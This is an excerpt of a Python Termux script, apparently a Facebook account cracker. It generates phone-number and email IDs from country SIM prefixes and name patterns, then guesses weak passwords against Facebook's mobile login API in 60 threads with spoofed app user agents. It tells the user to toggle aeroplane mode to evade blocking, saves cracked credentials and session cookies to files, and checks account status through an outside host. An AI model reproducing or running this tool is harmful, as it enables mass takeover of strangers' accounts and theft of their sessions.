...
os.system("xdg-open https://m.facebook.com/groups/termux.working.commands/?ref=share&mibextid=NSMWBT")
...
def ua1():
	...
	END = '[FBAN/FB4A;FBAV/278.0.0.8.159;FBBV/564078198;FBDM/{density=2.5,width=1080,height=1415};FBLC/en_IN;FBRV/127531646;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9T;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]'
...
def uax():
	...
	gtt=random.choice(xxxxx)
	gttt=random.choice(xxxxx)
	END = 'FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBCR/VIVA;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6906;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {str(gtt)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
	return ua
def ua2():
	END = '[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/BSNL MOBILE;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'
...
\033[1;97m║ \033[1;96mDEVOLPER : \033[1;92mKHALID SHAIFULLAH  \033[1;92m║\033[0;101mVERSION-1.5\033[0m\033[1;97m║
\033[1;97m║ \033[1;96mFACEBOOK : \033[1;93mKHALID SHAIFULLAH  \033[1;92m║═══════════\033[1;97m║
\033[1;97m║ \033[1;96mGITHUB   : \033[1;94mKHALID-404         \033[1;92m║ \033[1;93m RANDOM   \033[1;97m║
\033[1;97m║ \033[1;96mWHATSAPP : \033[1;95m+8801798396843     \033[1;92m║\033[1;92mBANGLADESH \033[1;97m║
\033[1;97m┗\033[1;92m═══════════════════════════════┻═══════════\033[1;97m╝\033[0m""")
def Main():
	logo()
	print(f'\033[1;91m[\033[1;92m01\033[1;91m]\033[1;91m[{G}A\033[1;91m]{W} CRACK FROM \033[1;91m[{G}RANDOM BD\033[1;91m]');print(f'\033[1;91m[\033[1;92m02\033[1;91m]\033[1;91m[{G}B\033[1;91m]{W} CRACK FROM \033[1;91m[{G}GMAIL\033[1;91m]');print(f'\033[1;91m[\033[1;92m03\033[1;91m]\033[1;91m[{G}C\033[1;91m]{W} CRACK FROM \033[1;91m[{G}RANDOM PAK\033[1;91m]');print(f'\033[1;91m[\033[1;92m00\033[1;91m]\033[1;91m[{G}X\033[1;91m]{W} EXIT')
	line()
...
def menu2():
	...
	code=input(f'\033[1;91m[{G}•{E}\033[1;91m] \033[1;92mCHOICE : {G}');print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═')
	print(f'{W}EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W} ');line()
	limit=int(input(f'[{G}+{E}] ENTER YOUR LIMIT : {G}'))
	print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═');print(f"\033[1;91m[{G}A\033[1;91m] {W}AUTO PASSWORD {W}\n\033[1;91m[{G}B\033[1;91m]{W} CHOICE PASSWORD{W}");line()
	psdgg=input(f'\033[1;91m[{G}•\033[1;91m] CHOOSE: {G}')
	if psdgg in ['B',"2","b"]:
		print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═');passx = int(input(f"\033[1;91m[\033[1;92m•\033[1;91m] Enter Password Limit : "))
		for dhhh in range(passx):
			print(f'{W}EXAMPLE : {G}rakib{W},{G}sakib{W},{G}rabbi{W},{G}tanvir{W},{G}jahid{W} ')
			line();pww = input(f"\033[1;91m[\033[1;92m•\033[1;91m] ENTER PASSWORD : ")
			paswtrh.append(pww)
	else:
		pww =str(0)
		paswtrh.append(pww)
	print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═');print(f'\033[1;91m[{G}A\033[1;91m] METHOD [{G}1\033[1;91m]\n\033[1;91m[{G}B\033[1;91m] METHOD [{G}2\033[1;91m]\n\033[1;91m[{G}C\033[1;91m] METHOD [{G}3\033[1;91m]');line()
	mxt=input(f'\033[1;91m[{G}•\033[1;91m] CHOOSE: {G}')
	for number in range(limit):
		numberx = ''.join(random.choice(string.digits) for _ in range(8))
		xode.append(numberx)
	with ThreadPool(max_workers=60) as khalid:
		tid= str(len(xode))
		logo();print(f'\033[1;91m[{G}•\033[1;91m] TOTAL ID :\033[1;92m '+tid);print (f'\033[1;91m[{G}•\033[1;91m] \033[1;97mSIM CODE : \033[1;92m'+code);print(f'\033[1;91m[{G}•\033[1;91m] \033[1;37mTHE PROCESS HAS BEEN STARTED');print(f'\033[1;91m[{G}•\033[1;91m] \033[1;37mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(40*"=")
		for rngx in xode:
			id=code+rngx
			...
			for thdhy in paswtrh:
				psd.append(thdhy)
			if mxt in ['A','1',"a"]:
				khalid.submit(graphrm,id,psd,tid)
			if mxt in ['B',"2","b"]:
				khalid.submit(graphrm,id,psd,tid)
			elif mxt in ['C',"3","c"]:
				khalid.submit(apirm,id,psd,tid)

def menup():
	logo()
	print(f"{W}PAK SIM CODE : {G}0306 0315 0335 0345{W}");line()
	code=input(f'\033[1;91m[{G}•{E}\033[1;91m] \033[1;92mCHOICE : {G}');print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═')
	print(f'{W}EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W} ');line()
	limit=int(input(f'[{G}+{E}] ENTER YOUR LIMIT : {G}'))
	print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═');print(f"\033[1;91m[{G}A\033[1;91m] {W}AUTO PASSWORD {W}\n\033[1;91m[{G}B\033[1;91m]{W} CHOICE PASSWORD{W}");line()
	...
	with ThreadPool(max_workers=60) as khalid:
		...
		for rngx in xode:
			id=code+rngx
			psd=[id,rngx,id[:6],'khankhan','khan123','khan1122']
			for thdhy in paswtrh:
				psd.append(thdhy)
			if mxt in ['A','1',"a"]:
				khalid.submit(graphrm,id,psd,tid)
...
def menui():
	logo()
	print(f"{W}IND SIM CODE : {G}9670 9725 8948 8795 6383 {E}{W}");line()
	code=input(f'\033[1;91m[{G}•{E}\033[1;91m] \033[1;92mCHOICE : {G}');print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═')
	print(f'{W}EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W} ');line()
	limit=int(input(f'[{G}+{E}] ENTER YOUR LIMIT : {G}'))
	print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═');print(f"\033[1;91m[{G}A\033[1;91m] {W}AUTO PASSWORD {W}\n\033[1;91m[{G}B\033[1;91m]{W} CHOICE PASSWORD{W}");line()
	...
	with ThreadPool(max_workers=60) as khalid:
		...
		for rngx in xode:
			id=code+rngx
			psd=[id,rngx,id[:6],"57273200","freefire",'i love you']
			for thdhy in paswtrh:
				psd.append(thdhy)
			if mxt in ['A','1',"a"]:
				khalid.submit(graphrm,id,psd,tid)
...
def menu3():
	...
	frs=input(f'\033[1;91m[{G}+{E}] Fast Name : {G}');print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═')
	print(f'{W}EXAMPLE : {G}hosain{W},{G}mahmud{W},{G}islam{W},{G}ahmed{W},{G}khan{W}');line()
	lst=input(f'\033[1;91m[{G}+{E}] Last Name : {G}');print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═');print(f'{W}EXAMPLE: {G}500{W},{G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W} ');line()
	limit=int(input(f'[{G}+{E}] ENTER YOUR LIMIT : {G}'));print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═')
	print(f'{W}EXAMPLE : {G}@gmail.com{W} , {G}@yahoo.com{W} {R}ETC{G}...{W}');line()
	dmn=input(f'\033[1;91m[{G}+{E}] Domain : {G}')
	print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═');print(f"\033[1;91m[{G}A\033[1;91m] {W}AUTO PASSWORD {W}\n\033[1;91m[{G}B\033[1;91m]{W} CHOICE PASSWORD{W}");line()
	psdgg=input(f'\033[1;91m[{G}•\033[1;91m] CHOOSE: {G}')
	if psdgg in ['B',"2","b"]:
		print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═');passx = int(input(f"[{G}+\033[1;91m] Enter Password Limit : {G}"))
		for dhhh in range(passx):
			print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═');print(f"{W}Don't try : {G}123{W},{G}1234{W},{G}12345{W},{G}@@##{W},{G}@@@{W},{G}@@{W},{G}@{W} ")
			print(f'{W}Try it : {G}1122{W},{G}@#{W},{G}##{W},{G}@@@@{W},{G}@123{W},{G}@12345{W},{G}11{W} ')
			print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═');pww = input(f"[{G}+\033[1;91m] Enter Password : {G}First+")
			paswtrh.append(pww)
	else:
		pww =str(0)
		paswtrh.append(pww)
	...
	for gmnu in range(limit):
		...
		if '9' in lcxt:
			...
			xode.append(digx)
	with ThreadPool(max_workers=30) as khalid:
		tid= str(len(xode))
		logo();print (f'\033[1;91m[{G}•\033[1;91m] {W}DOMAIN : \033[1;92m'+dmn);print(f'\033[1;91m [{G}•\033[1;91m] TOTAL ID :{G} '+tid);print (f'\033[1;91m[{G}•\033[1;91m] \033[1;97mFULL NAME : \033[1;92m'+frs+" "+lst);print(f'\033[1;91m[{G}•\033[1;91m] \033[1;37mTHE PROCESS HAS BEEN STARTED');print(f'\033[1;91m[{G}•\033[1;91m] \033[1;37mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(40*"=")
		for rngx in xode:
			id=frs+lst+rngx+dmn
...
def menu4():
	logo()
	print(f'{W}EXAMPLE : {G}rakib{W},{G}sakib{W},{G}rabbi{W},{G}tanvir{W},{G}jahid{W} ');line()
	frs=input(f'\033[1;91m[{G}+{E}] FIRST NAME : {G}');print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═')
	print(f'{W}EXAMPLE : {G}hosain{W},{G}mahmud{W},{G}islam{W},{G}ahmed{W},{G}khan{W}');line()
	lst=input(f'\033[1;91m[{G}+{E}] LAST NAME : {G}');print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═');
	print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═');print(f"\033[1;91m[{G}A\033[1;91m] {W}AUTO PASSWORD {W}\n\033[1;91m[{G}B\033[1;91m]{W} CHOICE PASSWORD{W}");line()
	psdgg=input(f'\033[1;91m[{G}•\033[1;91m] CHOOSE: {G}')
	if psdgg in ['B',"2","b"]:
		print(16*'\033[1;92m═'+'\033[1;91m[\033[1;92mKHALID-404\033[1;91m]'+16*'\033[1;92m═');passx = int(input(f"\033[1;91m[\033[1;92m•\033[1;91m] Enter Password Limit : "))
	...
	with ThreadPool(max_workers=30) as khalid:
		tid= str(len(xode))
		logo();print(f'\033[1;91m [{G}•\033[1;91m] TOTAL ID :{G} '+tid);print (f'\033[1;91m[{G}•\033[1;91m] \033[1;97mFULL NAME : \033[1;92m'+frs+" "+lst);print(f'\033[1;91m[{G}•\033[1;91m] \033[1;37mTHE PROCESS HAS BEEN STARTED');print(f'\033[1;91m[{G}•\033[1;91m] \033[1;37mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(40*"=")
		for rngx in xode:
			id=frs+lst+rngx
...
def chk(iid):
    get_req = requests.get(f"https://livedeadsegs.pythonanywhere.com/segs_uid?uid={iid}").text
    if 'LIVE' in get_req:
        print('\r\r\033[1;32m[KHALID-LIVE]  ' +iid+ ' | ' +psw+ '\033[1;91m <=>' +bal+    '  \n\033[1;35m[‎‎💥]\033[1;32mCOOKIE = \033[1;34m'+coki)
        ok.append(id)
        open('/sdcard/KHALID-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
    else:
        print('\r\r\033[1;31m[KHALID-LOCKED]  ' +iid+ ' | ' +psw+ '\033[1;91m <=>' +bal+    '  \n\033[1;35m[‎‎💥]\033[1;32mCOOKIE = \033[1;34m'+coki)
def graphrm(id,psd,tid):
	global ok,cp,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}KHALID-M2{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
	for psw in psd:
		ua=random.choice(ugen)
		#ua='[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-nullFBCA/armeabi-v7a:armeabi;]'
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{S}[KHALID-2F] {iid} | {psw}{W}')
			open('/sdcard/KHALID-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{R}[KHALID-CP] {iid} | {psw}{W}')
				cp.append(id)
				open('/sdcard/KHALID-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
				break
		else:continue
...
def apirm(id,psd,tid):
	global ok,cp,lop
	ton=[]
	sys.stdout.write(f'\r\r{BG}[{W}KHALID-M3{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
	for psw in psd:
		...
		dataxx={'adid':str(uuid.uuid4()), 'email':id, 'password':psw,'cpl':'true', 'credentials_type':'device_based_login_password',"source": "device_based_login",'error_detail_type':'button_with_disabled', 'source':'login','format':'json', 'generate_session_cookies':'1','generate_analytics_claim':'1','generate_machine_id':'1',"locale":"en_US","client_country_code":"US",'device':gtt,'device_id':str(uuid.uuid4()), "method": "auth.login","fb_api_req_friendly_name": "authenticate", "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
		...
		if 'session_key' in jsn:
			iid=str(jsn['uid'])
			print(f'\r\r{G}[KHALID-OK] {iid} | {psw}{W}')
			ok.append(id)
			open('/sdcard/KHALID-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'\n') #+'  ------------>>>'+coki+"\n")
			break
		elif 'www.facebook.com' in jsn['error_msg']:
			if 'y' in cpx:
				print(f'\r\r{R}[KHALID-CP] {id} | {psw}{W}')
			cp.append(id)
			open('/sdcard/KHALID-CP.txt', 'a').write(id+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
##################
